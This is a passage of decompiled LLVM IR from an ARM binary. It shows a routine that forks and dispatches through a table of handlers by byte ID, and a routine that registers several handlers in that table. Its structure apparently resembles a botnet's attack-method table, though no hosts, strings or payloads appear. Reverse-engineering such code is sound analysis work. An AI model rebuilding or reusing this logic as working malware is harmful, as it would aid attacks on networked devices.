  %v0_af38 = load i32, i32* @r6, align 4
  store i32 %v0_af38, i32* %r1.global-to-local, align 4
  %v0_af3c = load i32, i32* %r4.global-to-local, align 4
  %v3_af40 = call i32 @function_12db0(i32 %v3_af2c, i32 %v0_af38, i32 %v0_af3c)
  store i32 %v3_af40, i32* %r0.global-to-local, align 4
  %v0_af44 = load i32, i32* @sb, align 4
  %v1_af44 = load i32, i32* @fp, align 4
  %v9_af44 = icmp eq i32 %v0_af44, %v1_af44
  store i1 %v9_af44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af44, label %dec_label_pc_af4c, label %dec_label_pc_aee4

dec_label_pc_af4c:                                ; preds = %dec_label_pc_af24, %dec_label_pc_ae7c, %dec_label_pc_ae68
  %stack_var_-52.2 = phi i32 [ %v3_ae68, %dec_label_pc_ae68 ], [ %v4_ae84, %dec_label_pc_ae7c ], [ %v4_ae84, %dec_label_pc_af24 ]
  %v0_af4c = call i32* @__errno_location()
  %v2_af4c = ptrtoint i32* %v0_af4c to i32
  store i32 %v2_af4c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v0_af4c, align 4
  %v0_af58 = call i32 @fork()
  store i32 %v0_af58, i32* %r0.global-to-local, align 4
  %v7_af5c = icmp eq i32 %v0_af58, -1
  %v2_af68 = icmp eq i32 %v0_af58, 0
  store i1 %v2_af68, i1* %cpsr_z.global-to-local, align 1
  %tmp41 = icmp slt i32 %v0_af58, 1
  br i1 %tmp41, label %bb42, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_af4c
  store i32 1, i32* @r2, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_af7c

bb42:                                             ; preds = %dec_label_pc_af4c
  %. = zext i1 %v7_af5c to i32
  store i32 %., i32* @r2, align 4
  %v2_af74 = icmp eq i1 %v7_af5c, false
  store i1 %v2_af74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af74, label %dec_label_pc_afd0, label %dec_label_pc_af7c

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af04, %dec_label_pc_aeec, %dec_label_pc_aee4, %.thread1, %bb42, %dec_label_pc_aeb4, %dec_label_pc_aea0, %dec_label_pc_ae98, %dec_label_pc_ae5c
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_ae5c ], [ %stack_var_-52.2, %bb42 ], [ %v4_ae84, %dec_label_pc_ae98 ], [ %v4_ae84, %dec_label_pc_aea0 ], [ %v4_ae84, %dec_label_pc_aeb4 ], [ %stack_var_-52.2, %.thread1 ], [ %v4_ae84, %dec_label_pc_aee4 ], [ %v4_ae84, %dec_label_pc_aeec ], [ %v4_ae84, %dec_label_pc_af04 ]
  store i32 %v4_adf8, i32* %r1.global-to-local, align 4
  %v2_af80 = icmp eq i32* %v2_adf8, null
  store i1 %v2_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af80, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_af7c
  store i32 %v4_adf8, i32* %r0.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_af7c, %bb43
  store i32 44940, i32* %lr.global-to-local, align 4
  %v1_af88 = xor i1 %v2_af80, true
  call void @__pseudo_cond_branch(i1 %v1_af88, i32 ptrtoint (i32* @global_var_8d5c.106 to i32))
  %v2_af90 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_af90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af90, label %.dec_label_pc_adb8_crit_edge, label %dec_label_pc_af98

.dec_label_pc_adb8_crit_edge:                     ; preds = %bb44
  %v29_adbc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_adb8

dec_label_pc_af98:                                ; preds = %bb44
  %v0_af98 = load i32, i32* @sb, align 4
  %v2_af98 = icmp eq i32 %v0_af98, 0
  store i1 %v2_af98, i1* %cpsr_z.global-to-local, align 1
  %tmp45 = icmp slt i32 %v0_af98, 1
  br i1 %tmp45, label %dec_label_pc_afc0, label %dec_label_pc_afa0

dec_label_pc_afa0:                                ; preds = %dec_label_pc_af98
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afa0
  %v1_afa8 = phi i32 [ %v1_afb4, %dec_label_pc_afa4 ], [ 0, %dec_label_pc_afa0 ]
  store i32 %stack_var_-52.3, i32* %r1.global-to-local, align 4
  %v4_afa8 = mul i32 %v1_afa8, 8
  %v5_afa8 = add i32 %v4_afa8, %stack_var_-52.3
  %v6_afa8 = inttoptr i32 %v5_afa8 to i32*
  %v7_afa8 = load i32, i32* %v6_afa8, align 4
  store i32 %v7_afa8, i32* %r0.global-to-local, align 4
  %v2_afac = icmp eq i32 %v7_afa8, 0
  store i1 %v2_afac, i1* %cpsr_z.global-to-local, align 1
  store i32 44980, i32* %lr.global-to-local, align 4
  %v1_afb0 = xor i1 %v2_afac, true
  call void @__pseudo_cond_branch(i1 %v1_afb0, i32 ptrtoint (i32* @global_var_8d5c.106 to i32))
  %v0_afb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_afb4 = add i32 %v0_afb4, 1
  store i32 %v1_afb4, i32* %r4.global-to-local, align 4
  %v0_afb8 = load i32, i32* @sb, align 4
  %v9_afb8 = icmp eq i32 %v0_afb8, %v1_afb4
  store i1 %v9_afb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_afb8, label %dec_label_pc_afc0, label %dec_label_pc_afa4

dec_label_pc_afc0:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_af98
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v3_ad94, i32* %r4.global-to-local, align 4
  store i32 %v6_ad94, i32* %r5.global-to-local, align 4
  store i32 %v9_ad94, i32* @r6, align 4
  store i32 %v12_ad94, i32* @r7, align 4
  store i32 %v15_ad94, i32* %r8.global-to-local, align 4
  store i32 %v18_ad94, i32* @sb, align 4
  store i32 %v21_ad94, i32* @sl, align 4
  store i32 %v24_ad94, i32* @fp, align 4
  store i32 %v27_ad94, i32* %lr.global-to-local, align 4
  %v1_afcc = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_afcc)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_afd0

dec_label_pc_afd0:                                ; preds = %bb42, %dec_label_pc_afc0
  %stack_var_-52.4 = phi i32 [ %stack_var_-52.3, %dec_label_pc_afc0 ], [ %stack_var_-52.2, %bb42 ]
  %v2_afd4 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_afd4 = zext i8 %v2_afd4 to i32
  store i32 %v3_afd4, i32* %lr.global-to-local, align 4
  %v2_afd8 = icmp eq i8 %v2_afd4, 0
  store i1 %v2_afd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afd8, label %dec_label_pc_b020, label %dec_label_pc_afe0

dec_label_pc_afe0:                                ; preds = %dec_label_pc_afd0
  %v2_afe4 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 %v2_afe4, i32* %r0.global-to-local, align 4
  %v1_afe8 = inttoptr i32 %v2_afe4 to i32*
  %v2_afe8 = load i32, i32* %v1_afe8, align 4
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  store i32 %v4_adc4, i32* %r4.global-to-local, align 4
  %v1_aff0 = add i32 %v2_afe8, 4
  %v2_aff0 = inttoptr i32 %v1_aff0 to i8*
  %v3_aff0 = load i8, i8* %v2_aff0, align 1
  store i32 %v4_adc4, i32* %r1.global-to-local, align 4
  %v9_aff8 = icmp eq i8 %v3_aff0, %v3_adc4
  store i1 %v9_aff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aff8, label %dec_label_pc_b028, label %dec_label_pc_b014.preheader

dec_label_pc_b014.preheader:                      ; preds = %dec_label_pc_afe0
  %v0_b014.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_b014

dec_label_pc_b004:                                ; preds = %dec_label_pc_b014
  %v4_b004 = mul i32 %v1_b014, 4
  %v5_b004 = add i32 %v4_b004, %v2_afe4
  %v6_b004 = inttoptr i32 %v5_b004 to i32*
  %v7_b004 = load i32, i32* %v6_b004, align 4
  store i32 %v7_b004, i32* %ip.global-to-local, align 4
  %v1_b008 = add i32 %v7_b004, 4
  %v2_b008 = inttoptr i32 %v1_b008 to i8*
  %v3_b008 = load i8, i8* %v2_b008, align 1
  %v9_b00c = icmp eq i8 %v3_b008, %v3_adc4
  store i1 %v9_b00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b00c, label %dec_label_pc_b028, label %dec_label_pc_b014

dec_label_pc_b014:                                ; preds = %dec_label_pc_b014.preheader, %dec_label_pc_b004
  %v0_b014 = phi i32 [ %v0_b014.pre, %dec_label_pc_b014.preheader ], [ %v1_b014, %dec_label_pc_b004 ]
  %v1_b014 = add i32 %v0_b014, 1
  %v9_b018 = icmp eq i32 %v1_b014, %v3_afd4
  store i1 %v9_b018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b018, label %dec_label_pc_b020, label %dec_label_pc_b004

dec_label_pc_b020:                                ; preds = %dec_label_pc_b014, %dec_label_pc_afd0, %dec_label_pc_b028
  store i32 0, i32* %r0.global-to-local, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_b028:                                ; preds = %dec_label_pc_b004, %dec_label_pc_afe0
  %v0_b060 = phi i32 [ %v2_afe8, %dec_label_pc_afe0 ], [ %v7_b004, %dec_label_pc_b004 ]
  %v0_b028 = load i32, i32* @sl, align 4
  store i32 %stack_var_-52.4, i32* %r4.global-to-local, align 4
  %v2_b04c = call i32 @llvm.bswap.i32(i32 %v0_b028)
  store i32 %v2_b04c, i32* %r0.global-to-local, align 4
  %v0_b054 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_b054, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_b064.111 to i32), i32* %lr.global-to-local, align 4
  %v1_b060 = inttoptr i32 %v0_b060 to i32*
  %v2_b060 = load i32, i32* %v1_b060, align 4
  call void @__pseudo_branch(i32 %v2_b060)
  br label %dec_label_pc_b020

; uselistorder directives
  uselistorder i32 %v1_b014, { 2, 0, 1 }
  uselistorder i1 %v9_b00c, { 1, 0 }
  uselistorder i1 %v9_aff8, { 1, 0 }
  uselistorder i32 %v1_afb4, { 1, 2, 0 }
  uselistorder i1 %v2_af80, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.3, { 2, 4, 3, 0, 1, 5 }
  uselistorder i1 %v2_af74, { 1, 0 }
  uselistorder i1 %v7_af5c, { 1, 0 }
  uselistorder i32 %v0_af58, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-52.2, { 2, 0, 1 }
  uselistorder i32 %v3_af2c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %v2_af10, { 1, 0 }
  uselistorder i32 %v1_af08, { 2, 0, 1, 3 }
  uselistorder i32 %v4_af04, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ae98, { 0, 2, 1 }
  uselistorder i32 %v4_ae84, { 0, 1, 2, 10, 9, 8, 3, 5, 6, 7, 4, 11 }
  uselistorder i32 %v3_ae68, { 2, 0, 1, 3 }
  uselistorder i32 %v1_ae44, { 1, 0 }
  uselistorder i32 %v0_ae28, { 0, 2, 1 }
  uselistorder i32 %v0_ae04, { 1, 2, 0, 3 }
  uselistorder i32 %v4_adf8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_ade4, { 2, 1, 0 }
  uselistorder i32 %v4_add0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_ada4, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32 %v3_ad94, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 1, 2, 4, 6, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 3, 7, 8, 25, 9, 10, 13, 2, 17, 14, 11, 12, 15, 16, 23, 18, 19, 20, 21, 22, 26, 24, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 16, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 %arg2, { 1, 2, 4, 0, 3, 5, 6 }
  uselistorder label %dec_label_pc_b020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b014, { 1, 0 }
  uselistorder label %dec_label_pc_afd0, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_af7c, { 4, 3, 0, 1, 2, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_af24, { 1, 0 }
  uselistorder label %dec_label_pc_adb8, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_b070(i32 %arg1) local_unnamed_addr {
dec_label_pc_b070:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b070 = load i32, i32* @r4, align 4
  store i32 %v3_b070, i32* %stack_var_-24, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b07c = call i32* @calloc(i32 1, i32 8)
  %v3_b07c = ptrtoint i32* %v2_b07c to i32
  store i32 ptrtoint (i8** @global_var_1c1bc.108 to i32), i32* %r4.global-to-local, align 4
  %v2_b084 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b084 = zext i8 %v2_b084 to i32
  store i32 ptrtoint (i32* @global_var_1c1c0.110 to i32), i32* %r6.global-to-local, align 4
  store i32 56848, i32* %r2.global-to-local, align 4
  store i32 %v3_b07c, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b098 = mul nuw nsw i32 %v3_b084, 4
  store i32 %v3_b098, i32* %r1.global-to-local, align 4
  %v2_b09c = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 56848, i32* %v2_b07c, align 4
  %v0_b0a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 4
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a8 = add i32 %v0_b0a8, 4
  store i32 %v1_b0a8, i32* %r1.global-to-local, align 4
  %v4_b0ac = inttoptr i32 %v2_b09c to i32*
  %v5_b0ac = call i32* @realloc(i32* %v4_b0ac, i32 %v1_b0a8)
  %v7_b0ac = ptrtoint i32* %v5_b0ac to i32
  %v2_b0b0 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b0b0 = zext i8 %v2_b0b0 to i32
  store i32 %v3_b0b0, i32* %r3.global-to-local, align 4
  store i32 %v7_b0ac, i32* %ip.global-to-local, align 4
  %v0_b0b8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b0b8 = mul nuw nsw i32 %v3_b0b0, 4
  %v6_b0b8 = add i32 %v5_b0b8, %v7_b0ac
  %v7_b0b8 = inttoptr i32 %v6_b0b8 to i32*
  store i32 %v0_b0b8, i32* %v7_b0b8, align 4
  store i32 ptrtoint (i8* @global_var_1c1bd.115 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b0c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b0c8 = inttoptr i32 %v2_b0c8 to i8*
  store i8 ptrtoint (i8* @global_var_1c1bd.115 to i8), i8* %v3_b0c8, align 1
  %v0_b0cc = load i32, i32* %ip.global-to-local, align 4
  %v1_b0cc = load i32, i32* %r6.global-to-local, align 4
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  store i32 %v0_b0cc, i32* %v2_b0cc, align 4
  %v2_b0d0 = call i32* @calloc(i32 1, i32 8)
  %v3_b0d0 = ptrtoint i32* %v2_b0d0 to i32
  %v2_b0d4 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b0d4 = zext i8 %v2_b0d4 to i32
  store i32 ptrtoint (i32* @global_var_e4b8.117 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  store i32 %v3_b0d0, i32* %r5.global-to-local, align 4
  %v3_b0e4 = mul nuw nsw i32 %v3_b0d4, 4
  store i32 %v3_b0e4, i32* %r1.global-to-local, align 4
  %v2_b0e8 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_e4b8.117 to i32), i32* %v2_b0d0, align 4
  %v2_b0f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b0f0 = add i32 %v2_b0f0, 4
  %v4_b0f0 = inttoptr i32 %v3_b0f0 to i8*
  store i8 1, i8* %v4_b0f0, align 1
  %v0_b0f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f4, 4
  store i32 %v1_b0f4, i32* %r1.global-to-local, align 4
  %v3_b0f8 = inttoptr i32 %v2_b0e8 to i32*
  %v4_b0f8 = call i32* @realloc(i32* %v3_b0f8, i32 %v1_b0f4)
  %v6_b0f8 = ptrtoint i32* %v4_b0f8 to i32
  %v2_b0fc = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b0fc = zext i8 %v2_b0fc to i32
  store i32 %v3_b0fc, i32* %r3.global-to-local, align 4
  store i32 %v6_b0f8, i32* %ip.global-to-local, align 4
  %v0_b104 = load i32, i32* %r5.global-to-local, align 4
  %v5_b104 = mul nuw nsw i32 %v3_b0fc, 4
  %v6_b104 = add i32 %v5_b104, %v6_b0f8
  %v7_b104 = inttoptr i32 %v6_b104 to i32*
  store i32 %v0_b104, i32* %v7_b104, align 4
  %v0_b108 = load i32, i32* %r3.global-to-local, align 4
  %v1_b108 = load i32, i32* %r8.global-to-local, align 4
  %v2_b108 = add i32 %v1_b108, %v0_b108
  store i32 %v2_b108, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b114 = load i32, i32* %ip.global-to-local, align 4
  %v1_b114 = load i32, i32* %r6.global-to-local, align 4
  %v2_b114 = inttoptr i32 %v1_b114 to i32*
  store i32 %v0_b114, i32* %v2_b114, align 4
  %v0_b118 = load i32, i32* %r2.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* %r4.global-to-local, align 4
  %v3_b118 = inttoptr i32 %v2_b118 to i8*
  store i8 %v1_b118, i8* %v3_b118, align 1
  %v2_b11c = call i32* @calloc(i32 %v1_b108, i32 8)
  %v4_b11c = ptrtoint i32* %v2_b11c to i32
  %v2_b120 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b120 = zext i8 %v2_b120 to i32
  store i32 ptrtoint (i32* @global_var_e9b8.119 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b11c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b130 = mul nuw nsw i32 %v3_b120, 4
  store i32 %v3_b130, i32* %r1.global-to-local, align 4
  %v2_b134 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_e9b8.119 to i32), i32* %v2_b11c, align 4
  %v0_b13c = load i32, i32* %r3.global-to-local, align 4
  %v1_b13c = trunc i32 %v0_b13c to i8
  %v2_b13c = load i32, i32* %r5.global-to-local, align 4
  %v3_b13c = add i32 %v2_b13c, 4
  %v4_b13c = inttoptr i32 %v3_b13c to i8*
  store i8 %v1_b13c, i8* %v4_b13c, align 1
  %v0_b140 = load i32, i32* %r1.global-to-local, align 4
  %v1_b140 = add i32 %v0_b140, 4
  store i32 %v1_b140, i32* %r1.global-to-local, align 4
  %v4_b144 = inttoptr i32 %v2_b134 to i32*
  %v5_b144 = call i32* @realloc(i32* %v4_b144, i32 %v1_b140)
  %v7_b144 = ptrtoint i32* %v5_b144 to i32
  %v2_b148 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b148 = zext i8 %v2_b148 to i32
  store i32 %v3_b148, i32* %r3.global-to-local, align 4
  store i32 %v7_b144, i32* %ip.global-to-local, align 4
  %v1_b150 = load i32, i32* %r8.global-to-local, align 4
  %v2_b150 = add i32 %v1_b150, %v3_b148
  store i32 %v2_b150, i32* %r2.global-to-local, align 4
  %v0_b154 = load i32, i32* %r5.global-to-local, align 4
  %v5_b154 = mul nuw nsw i32 %v3_b148, 4
  %v6_b154 = add i32 %v5_b154, %v7_b144
  %v7_b154 = inttoptr i32 %v6_b154 to i32*
  store i32 %v0_b154, i32* %v7_b154, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b15c = load i32, i32* %r8.global-to-local, align 4
  %v0_b160 = load i32, i32* %r2.global-to-local, align 4
  %v1_b160 = trunc i32 %v0_b160 to i8
  %v2_b160 = load i32, i32* %r4.global-to-local, align 4
  %v3_b160 = inttoptr i32 %v2_b160 to i8*
  store i8 %v1_b160, i8* %v3_b160, align 1
  %v0_b164 = load i32, i32* %ip.global-to-local, align 4
  %v1_b164 = load i32, i32* %r6.global-to-local, align 4
  %v2_b164 = inttoptr i32 %v1_b164 to i32*
  store i32 %v0_b164, i32* %v2_b164, align 4
  %v2_b168 = call i32* @calloc(i32 %v0_b15c, i32 8)
  %v3_b168 = ptrtoint i32* %v2_b168 to i32
  %v2_b16c = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b16c = zext i8 %v2_b16c to i32
  store i32 ptrtoint (i32* @global_var_daec.121 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* %r7.global-to-local, align 4
  store i32 %v3_b168, i32* %r5.global-to-local, align 4
  %v3_b17c = mul nuw nsw i32 %v3_b16c, 4
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v2_b180 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_daec.121 to i32), i32* %v2_b168, align 4
  %v2_b188 = load i32, i32* %r5.global-to-local, align 4
  %v3_b188 = add i32 %v2_b188, 4
  %v4_b188 = inttoptr i32 %v3_b188 to i8*
  store i8 8, i8* %v4_b188, align 1
  %v0_b18c = load i32, i32* %r1.global-to-local, align 4
  %v1_b18c = add i32 %v0_b18c, 4
  store i32 %v1_b18c, i32* %r1.global-to-local, align 4
  %v3_b190 = inttoptr i32 %v2_b180 to i32*
  %v4_b190 = call i32* @realloc(i32* %v3_b190, i32 %v1_b18c)
  %v6_b190 = ptrtoint i32* %v4_b190 to i32
  %v2_b194 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b194 = zext i8 %v2_b194 to i32
  store i32 %v3_b194, i32* %r3.global-to-local, align 4
  store i32 %v6_b190, i32* %ip.global-to-local, align 4
  %v0_b19c = load i32, i32* %r5.global-to-local, align 4
  %v5_b19c = mul nuw nsw i32 %v3_b194, 4
  %v6_b19c = add i32 %v5_b19c, %v6_b190
  %v7_b19c = inttoptr i32 %v6_b19c to i32*
  store i32 %v0_b19c, i32* %v7_b19c, align 4
  %v0_b1a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_b1a0 = add i32 %v1_b1a0, %v0_b1a0
  store i32 %v2_b1a0, i32* %r2.global-to-local, align 4
  %v0_b1a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b1a4, i32* %r1.global-to-local, align 4
  %v0_b1ac = load i32, i32* %ip.global-to-local, align 4
  %v1_b1ac = load i32, i32* %r6.global-to-local, align 4
  %v2_b1ac = inttoptr i32 %v1_b1ac to i32*
  store i32 %v0_b1ac, i32* %v2_b1ac, align 4
  %v0_b1b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v0_b1b0 to i8
  %v2_b1b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b1b0 = inttoptr i32 %v2_b1b0 to i8*
  store i8 %v1_b1b0, i8* %v3_b1b0, align 1
  %v2_b1b4 = call i32* @calloc(i32 %v1_b1a0, i32 %v0_b1a4)
  %v4_b1b4 = ptrtoint i32* %v2_b1b4 to i32
  %v2_b1b8 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b1b8 = zext i8 %v2_b1b8 to i32
  store i32 ptrtoint (i32* @global_var_d370.123 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b1b4, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_b1c8 = mul nuw nsw i32 %v3_b1b8, 4
  store i32 %v3_b1c8, i32* %r1.global-to-local, align 4
  %v2_b1cc = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_d370.123 to i32), i32* %v2_b1b4, align 4
  %v0_b1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1d4 = trunc i32 %v0_b1d4 to i8
  %v2_b1d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b1d4 = add i32 %v2_b1d4, 4
  %v4_b1d4 = inttoptr i32 %v3_b1d4 to i8*
  store i8 %v1_b1d4, i8* %v4_b1d4, align 1
  %v0_b1d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1d8 = add i32 %v0_b1d8, 4
  store i32 %v1_b1d8, i32* %r1.global-to-local, align 4
  %v4_b1dc = inttoptr i32 %v2_b1cc to i32*
  %v5_b1dc = call i32* @realloc(i32* %v4_b1dc, i32 %v1_b1d8)
  %v7_b1dc = ptrtoint i32* %v5_b1dc to i32
  %v2_b1e0 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b1e0 = zext i8 %v2_b1e0 to i32
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  store i32 %v7_b1dc, i32* %ip.global-to-local, align 4
  %v0_b1e8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b1e8 = mul nuw nsw i32 %v3_b1e0, 4
  %v6_b1e8 = add i32 %v5_b1e8, %v7_b1dc
  %v7_b1e8 = inttoptr i32 %v6_b1e8 to i32*
  store i32 %v0_b1e8, i32* %v7_b1e8, align 4
  %v0_b1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b1ec = load i32, i32* %r8.global-to-local, align 4
  %v2_b1ec = add i32 %v1_b1ec, %v0_b1ec
  store i32 %v2_b1ec, i32* %r2.global-to-local, align 4
  %v0_b1f0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b1f0, i32* %r1.global-to-local, align 4
  %v0_b1f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b1f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_b1f8 = inttoptr i32 %v1_b1f8 to i32*
  store i32 %v0_b1f8, i32* %v2_b1f8, align 4
  %v0_b1fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b1fc = trunc i32 %v0_b1fc to i8
  %v2_b1fc = load i32, i32* %r4.global-to-local, align 4
  %v3_b1fc = inttoptr i32 %v2_b1fc to i8*
  store i8 %v1_b1fc, i8* %v3_b1fc, align 1
  %v2_b200 = call i32* @calloc(i32 %v1_b1ec, i32 %v0_b1f0)
  %v4_b200 = ptrtoint i32* %v2_b200 to i32
  %v2_b204 = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b204 = zext i8 %v2_b204 to i32
  store i32 ptrtoint (i32* @global_var_cbb4.125 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b200, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_b214 = mul nuw nsw i32 %v3_b204, 4
  store i32 %v3_b214, i32* %r1.global-to-local, align 4
  %v2_b218 = load i32, i32* @global_var_1c1c0.110, align 4
  store i32 ptrtoint (i32* @global_var_cbb4.125 to i32), i32* %v2_b200, align 4
  %v0_b220 = load i32, i32* %r3.global-to-local, align 4
  %v1_b220 = trunc i32 %v0_b220 to i8
  %v2_b220 = load i32, i32* %r5.global-to-local, align 4
  %v3_b220 = add i32 %v2_b220, 4
  %v4_b220 = inttoptr i32 %v3_b220 to i8*
  store i8 %v1_b220, i8* %v4_b220, align 1
  %v0_b224 = load i32, i32* %r1.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 4
  store i32 %v1_b224, i32* %r1.global-to-local, align 4
  %v4_b228 = inttoptr i32 %v2_b218 to i32*
  %v5_b228 = call i32* @realloc(i32* %v4_b228, i32 %v1_b224)
  %v7_b228 = ptrtoint i32* %v5_b228 to i32
  %v2_b22c = load i8, i8* bitcast (i8** @global_var_1c1bc.108 to i8*), align 4
  %v3_b22c = zext i8 %v2_b22c to i32
  store i32 %v3_b22c, i32* %r3.global-to-local, align 4
  store i32 %v7_b228, i32* %ip.global-to-local, align 4
